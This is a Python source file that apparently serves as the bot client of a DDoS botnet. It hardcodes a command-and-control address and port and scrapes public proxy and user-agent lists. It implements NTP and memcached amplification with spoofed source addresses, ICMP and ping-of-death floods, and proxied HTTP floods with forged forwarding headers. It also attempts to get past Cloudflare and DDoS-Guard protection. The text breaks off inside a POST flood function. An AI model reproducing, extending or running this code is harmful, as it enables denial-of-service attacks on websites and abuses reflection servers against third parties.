import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl, json, re
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from scapy.layers.inet import UDP
from colorama import Fore
    
KRYPTONC2_ADDRESS  = "208.76.40.94"
KRYPTONC2_PORT  = 11223

# Function to scrape user agents from various sources
def scrape_user_agents():
    print("[+] Starting user agent scraper in bot.py...")
    user_agents = []
    
    # Daftar sumber user agent yang diperluas
    ua_sources = [
        "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/master/Chrome.txt",
        "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/master/Edge.txt",
        "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/master/Firefox.txt",
        "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/master/Opera.txt",
        "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/master/Safari.txt",
        "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/master/Mobile.txt",
        "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt",
        "https://raw.githubusercontent.com/N0taN3rd/userAgentLists/master/Chrome.txt",
        "https://raw.githubusercontent.com/N0taN3rd/userAgentLists/master/FireFox.txt",
        "https://raw.githubusercontent.com/N0taN3rd/userAgentLists/master/Safari.txt",
        "https://raw.githubusercontent.com/N0taN3rd/userAgentLists/master/Mobile.txt",
        "https://raw.githubusercontent.com/N0taN3rd/userAgentLists/master/Bots.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/user-agents-whatismybrowsercom.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/UserAgents.fuzz.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/user-agents-browsers.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/crawler-user-agents.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/User-Agents/common-ua.txt",
        "https://raw.githubusercontent.com/mxrch/UserAgent-Switcher/master/user_agents.json",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_chrome.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_firefox.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_safari.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_edge.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_opera.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_android.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_ios.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_macos.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_linux.txt",
        "https://raw.githubusercontent.com/useragents/useragents/master/data/browsers/browser_windows.txt"
    ]
    
    # Ambil user agent dari berbagai sumber
    for source in ua_sources:
        try:
            response = requests.get(source, timeout=10)
            if response.status_code == 200:
                # Clean the response
                if source.endswith('.json'):
                    try:
                        # Handle JSON format
                        json_data = response.json()
                        if isinstance(json_data, list):
                            for item in json_data:
                                if isinstance(item, dict) and 'ua' in item:
                                    user_agents.append(item['ua'])
                                elif isinstance(item, str):
                                    user_agents.append(item)
                        elif isinstance(json_data, dict):
                            for key, value in json_data.items():
                                if isinstance(value, str):
                                    user_agents.append(value)
                                elif isinstance(value, dict) and 'ua' in value:
                                    user_agents.append(value['ua'])
                    except:
                        # If JSON parsing fails, treat as text
                        source_uas = response.text.replace('\r', '').strip().split('\n')
                        source_uas = [ua.strip() for ua in source_uas if ua.strip()]
                        user_agents.extend(source_uas)
                else:
                    source_uas = response.text.replace('\r', '').strip().split('\n')
                    source_uas = [ua.strip() for ua in source_uas if ua.strip()]
                    user_agents.extend(source_uas)
                
                print(f"[✓] Successfully fetched user agents from {source}")
            else:
                print(f"[!] Failed to fetch from {source}: Status code {response.status_code}")
        except Exception as e:
            print(f"[!] Error fetching from {source}: {str(e)}")
    
    # Hapus duplikat dan entri kosong
    user_agents = list(set([ua for ua in user_agents if ua and len(ua) > 10]))
    print(f"[+] Found {len(user_agents)} unique user agents")
    
    # Simpan user agent ke file
    file_name = "user_agents.txt"
    with open(file_name, "w", encoding="utf-8") as f:
        for ua in user_agents:
            if ua:  # Filter empty lines
                f.write(f"{ua}\n")
    print(f"[✓] Saved {len(user_agents)} user agents to {file_name}")
    
    print(f"[✓] User agent scraping completed successfully with {len(user_agents)} user agents.")
    return user_agents

# Global variable to store user agents
SCRAPED_USER_AGENTS = []

# Function to scrape proxies from various sources
def scrape_proxies(proxy_type="all"):
    print("[+] Starting proxy scraper in bot.py...")
    proxies = []
    
    # Daftar sumber proxy yang diperluas
    proxy_sources = {
        "http": [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
            "https://openproxylist.xyz/http.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/master/proxies/http.txt",
            "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
            "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
            "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
            "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
            "https://api.openproxylist.xyz/http.txt",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
            "https://api.proxyscan.io/v1/?limit=100&type=http",
            "https://www.proxyscan.io/download?type=http",
            "https://www.proxyscan.io/download?type=https",
            "https://www.proxy-list.download/api/v1/get?type=https"
        ],
        "socks4": [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://openproxylist.xyz/socks4.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4",
            "https://api.openproxylist.xyz/socks4.txt",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=90&protocols=socks4",
            "https://api.proxyscan.io/v1/?limit=100&type=socks4",
            "https://www.proxyscan.io/download?type=socks4"
        ],
        "socks5": [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://openproxylist.xyz/socks5.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5",
            "https://api.openproxylist.xyz/socks5.txt",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=90&protocols=socks5",
            "https://api.proxyscan.io/v1/?limit=100&type=socks5",
            "https://www.proxyscan.io/download?type=socks5"
        ]
    }
    
    # Tambahkan API scraper
    api_sources = {
        "all": [
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&sort_type=desc",
            "https://proxylist.geonode.com/api/proxy-list?limit=500&page=3&sort_by=lastChecked&sort_type=desc",
            "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.json"
        ]
    }
    
    # Ambil proxy dari berbagai sumber
    for ptype, sources in proxy_sources.items():
        if proxy_type != "all" and ptype != proxy_type:
            continue
            
        print(f"[+] Fetching {ptype.upper()} proxies...")
        for source in sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    # Clean the response
                    source_proxies = response.text.replace('\r', '').strip().split('\n')
                    source_proxies = [p.strip() for p in source_proxies if p.strip()]
                    # Filter valid format proxies (IP:PORT)
                    source_proxies = [p for p in source_proxies if re.match(r"\d+\.\d+\.\d+\.\d+:\d+", p)]
                    
                    proxies.extend(source_proxies)
                    print(f"[✓] Successfully fetched {len(source_proxies)} {ptype.upper()} proxies from {source}")
                else:
                    print(f"[!] Failed to fetch from {source}: Status code {response.status_code}")
            except Exception as e:
                print(f"[!] Error fetching from {source}: {str(e)}")
    
    # Ambil proxy dari API sources yang memerlukan parsing JSON
    if proxy_type == "all" or proxy_type in ["http", "socks4", "socks5"]:
        print(f"[+] Fetching from API sources...")
        
        for source in api_sources["all"]:
            try:
                response = requests.get(source, timeout=15)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if "data" in data:
                            for proxy_data in data["data"]:
                                if "ip" in proxy_data and "port" in proxy_data:
                                    ip = proxy_data["ip"]
                                    port = proxy_data["port"]
                                    protocol = proxy_data.get("protocols", ["http"])[0].lower()
                                    
                                    if proxy_type == "all" or protocol == proxy_type:
                                        proxy_str = f"{ip}:{port}"
                                        proxies.append(proxy_str)
                        elif isinstance(data, list):
                            for item in data:
                                if isinstance(item, dict) and "ip" in item and "port" in item:
                                    proxies.append(f"{item['ip']}:{item['port']}")
                        
                        print(f"[✓] Successfully fetched proxies from API: {source}")
                    except Exception as e:
                        print(f"[!] Error parsing JSON from {source}: {str(e)}")
                else:
                    print(f"[!] Failed to fetch from API {source}: Status code {response.status_code}")
            except Exception as e:
                print(f"[!] Error fetching from API {source}: {str(e)}")
    
    # Tambahkan scraping dari free-proxy-list.net menggunakan parsing HTML
    try:
        print(f"[+] Scraping from free-proxy-list.net...")
        response = requests.get("https://free-proxy-list.net/", timeout=15)
        if response.status_code == 200:
            # Ekstrak IP:PORT dari HTML menggunakan regex
            pattern = r"(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)"
            matches = re.findall(pattern, response.text)
            
            free_proxies = [f"{ip}:{port}" for ip, port in matches]
            proxies.extend(free_proxies)
            print(f"[✓] Successfully fetched {len(free_proxies)} proxies from free-proxy-list.net")
    except Exception as e:
        print(f"[!] Error scraping from free-proxy-list.net: {str(e)}")
        
    # Try to scrape from sslproxies.org
    try:
        print(f"[+] Scraping from sslproxies.org...")
        response = requests.get("https://www.sslproxies.org/", timeout=15)
        if response.status_code == 200:
            pattern = r"(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)"
            matches = re.findall(pattern, response.text)
            
            ssl_proxies = [f"{ip}:{port}" for ip, port in matches]
            proxies.extend(ssl_proxies)
            print(f"[✓] Successfully fetched {len(ssl_proxies)} proxies from sslproxies.org")
    except Exception as e:
        print(f"[!] Error scraping from sslproxies.org: {str(e)}")
        
    # Try to scrape from us-proxy.org
    try:
        print(f"[+] Scraping from us-proxy.org...")
        response = requests.get("https://www.us-proxy.org/", timeout=15)
        if response.status_code == 200:
            pattern = r"(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)"
            matches = re.findall(pattern, response.text)
            
            us_proxies = [f"{ip}:{port}" for ip, port in matches]
            proxies.extend(us_proxies)
            print(f"[✓] Successfully fetched {len(us_proxies)} proxies from us-proxy.org")
    except Exception as e:
        print(f"[!] Error scraping from us-proxy.org: {str(e)}")
    
    # Hapus duplikat
    proxies = list(set(proxies))
    print(f"[+] Found {len(proxies)} unique proxies")
    
    # Simpan proxy ke file berdasarkan tipe
    if proxy_type == "all":
        files_to_save = {"socks4.txt": [], "socks5.txt": [], "http.txt": []}
        # Untuk simplifikasi, kita hanya simpan semua proxy ke semua file
        for file_name in files_to_save:
            with open(file_name, "w") as f:
                for proxy in proxies:
                    if proxy:  # Filter empty lines
                        f.write(f"{proxy}\n")
            print(f"[✓] Saved {len(proxies)} proxies to {file_name}")
    else:
        # Save specific proxy type
        file_name = f"{proxy_type}.txt"
        with open(file_name, "w") as f:
            for proxy in proxies:
                if proxy:  # Filter empty lines
                    f.write(f"{proxy}\n")
        print(f"[✓] Saved {len(proxies)} {proxy_type.upper()} proxies to {file_name}")
    
    print(f"[✓] Proxy scraping completed successfully with {len(proxies)} proxies.")
    return proxies

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
]

def rand_ua():
    global SCRAPED_USER_AGENTS
    
    # If we have scraped user agents, use them
    if SCRAPED_USER_AGENTS:
        return random.choice(SCRAPED_USER_AGENTS)
    
    # Try to read from file if exists
    try:
        if os.path.exists("user_agents.txt"):
            with open("user_agents.txt", "r", encoding="utf-8") as f:
                SCRAPED_USER_AGENTS = [line.strip() for line in f if line.strip()]
            if SCRAPED_USER_AGENTS:
                return random.choice(SCRAPED_USER_AGENTS)
    except:
        pass
    
    # Fallback to hardcoded user agents
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
    ]
    return random.choice(user_agents)


ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        print(f"Erro: {e}")
        pass

    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=random.randint(1, 65535), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(50000000):
                    send(packet, count=packets, verbose=False)
                    #print('NTP SEND')
            except Exception as e:
               # print(f"Erro: {e}")
                pass
        except Exception as e:
            #print(f"Erro: {e}")
            pass

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    packets = random.randint(1024, 60000)
    try:
        with open("memsv.txt", "r") as f:
            memsv = f.readlines()
    except:
        #print('Erro')
        pass
    server = random.choice(memsv).strip()
    while time.time() < timer:
        try:
            try:
                packet = (
                        IP(dst=server, src=target)
                        / UDP(sport=port, dport=11211)
                        / Raw(load=mem_payload)
                )
                for _ in range(5000000):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass

def icmp(target, timer):
    while time.time() < timer:
        try:
            for _ in range(5000000):
                packet = random._urandom(int(random.randint(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
                #print('MEMCACHED SEND')
        except:
            pass

def pod(target, timer):
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass


# old methods --------------------->
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

def httpSpoofAttack(url, timer):
    timeout = time.time() + int(timer)
    
    # Get proxies using scrape_proxies function
    try:
        proxies = scrape_proxies("socks4")
        if not proxies:
            # Try to read from file as fallback
            try:
                proxies = open("socks4.txt").readlines()
            except:
                proxies = []
    except:
        # Try to read from file as fallback
        try:
            proxies = open("socks4.txt").readlines()
        except:
            proxies = []
    
    if not proxies:
        return
        
    proxy = random.choice(proxies).strip().split(":")
    req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
    req += "Via: "+spoofer()+"\r\n"
    req += "Client-IP: "+spoofer()+"\r\n"
    req += "X-Forwarded-For: "+spoofer()+"\r\n"
    req += "Real-IP: "+spoofer()+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            try:
                for i in range(5000000000):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()


def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'User-Agent': rand_ua()}
        
        try:
            response = proxiedRequest.get(target, headers=headers)

            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)

    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}

        try:
            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)

            if a.status_code >= 200 and a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)
    
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()

        try:
            a = scraper.get(target, headers=headers, timeout=15)
        except:
            pass

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)

def httpio(target, times, threads, attack_type):
    proxies = []
    if attack_type == 'PROXY' or attack_type == 'proxy':
        cfbp = 0
        try:
            # Use scrape_proxies function to get HTTP proxies
            proxies = scrape_proxies("http")
        except:
            pass

    elif attack_type == 'NORMAL' or attack_type == 'normal':
        cfbp = 1
        try:
            # Use scrape_proxies function to get HTTP proxies
            proxies = scrape_proxies("http")
        except:
            pass
    
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
    time.sleep(times)
    
    for p in processes:
        os.kill(p.pid, 9)

def CFB(url, port, secs):
    url = url + ":" + port
    while time.time() < secs:

        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        for _ in range(1500):
            scraper.get(url, headers=headers, timeout=15)
            scraper.head(url, headers=headers, timeout=15)

def STORM_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:

        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            requests.head(ip, headers=headers)
            scraper.get(ip, headers=headers)

def GET_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            scraper.get(ip, headers=headers)

def HEAD_attack(ip, port, secs):
    ip = ip + ":" + port
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        try:
            for _ in range(1500):
                requests.head(ip, headers=headers, timeout=(5, 2), allow_redirects=False, stream=False)
        except:
            pass

def HEX_attack(ip, port, secs):
    ip = ip + ":" + port
    session = requests.Session()
    while time.time() < secs:
        try:
            headers = {'User-Agent': rand_ua()}
            # Генерація випадкового hex
            randhex = os.urandom(random.randint(16, 32)).hex()
            
            session.get(f"{ip}/{randhex}", headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
        except:
            pass

def GHEADPOST_attack(ip, port, secs):
    ip = ip + ":" + port
    session = requests.Session()
    while time.time() < secs:
        try:
            headers = {'User-Agent': rand_ua()}
            target_url = f"{ip}/{os.urandom(8).hex()}"

            # Generate some random form data
            form_data = f"param1={os.urandom(8).hex()}&param2={os.urandom(8).hex()}"
            headers.update({'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(form_data))})
            
            rand_choice = random.randint(0, 2)
            if rand_choice == 0: 
                session.get(target_url, headers=headers, timeout=(5, 2), verify=False)
            elif rand_choice == 1: 
                session.head(target_url, headers=headers, timeout=(5, 2), verify=False)
            elif rand_choice == 2: 
                session.post(target_url, headers=headers, data=form_data, timeout=(5, 2), verify=False)
        except:
            pass

def DDOSGUARD_attack(ip, port, secs):
    ip = ip + ":" + port
    stoptime = time.time() + int(secs)
    
    # Attempt to read proxies from file
    try:
        proxies = []
        try:
            # Use scrape_proxies function to get HTTP proxies
            proxies = scrape_proxies("http")
        except:
            pass
            
        proxy = random.choice(proxies) if proxies else None
        
        while time.time() < stoptime:
            session = requests.Session()
            try:
                # Attempt to bypass DDoS-Guard protection
                session.post('https://check.ddos-guard.net/check.js')
                headers = {'User-Agent': rand_ua()}
                
                if proxy:
                    session.get(ip, headers=headers, verify=False, timeout=(5, 2), allow_redirects=False, 
                                proxies={'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'})
                else:
                    session.get(ip, headers=headers, verify=False, timeout=(5, 2), allow_redirects=False)
            except:
                if proxies:
                    proxy = random.choice(proxies)
    except:
        pass

def MDR_attack(ip, port, secs):
    ip = ip + ":" + port
    stoptime = time.time() + int(secs)
    
    # Lista reférer para spoofing
    reFerers = [
        "https://www.google.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.instagram.com/",
        "https://www.bing.com/",
    ]
    
    while time.time() < stoptime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip.split(':')[0], int(port)))
            
            # Construir um cabeçalho HTTP customizado com spoofing
            useragent = "User-Agent: " + rand_ua() + "\r\n"
            forward = "X-Forwarded-For: " + spoofer() + "\r\n"
            referer = "Referer: " + random.choice(reFerers) + "\r\n"
            accept = "Accept-Encoding: gzip, deflate\r\n"
            connection = "Connection: Keep-Alive, Persist\r\n"
            
            http_req = f"GET / HTTP/1.1\r\nHost: {ip.split(':')[0]}\r\n{useragent}{referer}{accept}{forward}{connection}\r\n\r\n"
            
            for _ in range(100):
                try:
                    sock.send(http_req.encode())
                except:
                    break
            
            sock.close()
        except:
            pass

def POST_attack(ip, port, secs):
    ip = ip + ":" + port
    stoptime = time.time() + int(secs)
    session = requests.Session()
    
    # Keywords for generating random form data
    keywords = [
        'access', 'admin', 'dbg', 'debug', 'edit', 'grant', 'test', 'alter', 'clone',
        'create', 'delete', 'disable', 'enable', 'exec', 'execute', 'load', 'make',
        'modify', 'rename', 'reset', 'shell', 'toggle', 'adm', 'root', 'cfg',
        'dest', 'redirect', 'uri', 'path', 'continue', 'url', 'window', 'return',
        'session', 'value', 'username', 'password', 'user', 'usr', 'pass', 'pwd',
        'group', 'account', 'id', 'select', 'report', 'update', 'query', 'default'
    ]
    
    while time.time() < stoptime:
        try:
            # Set up headers with random User-Agent
            headers = {'User-Agent': rand_ua(),
                      'X-Forwarded-For': spoofer()}
            
            # Generate random form-urlencoded data
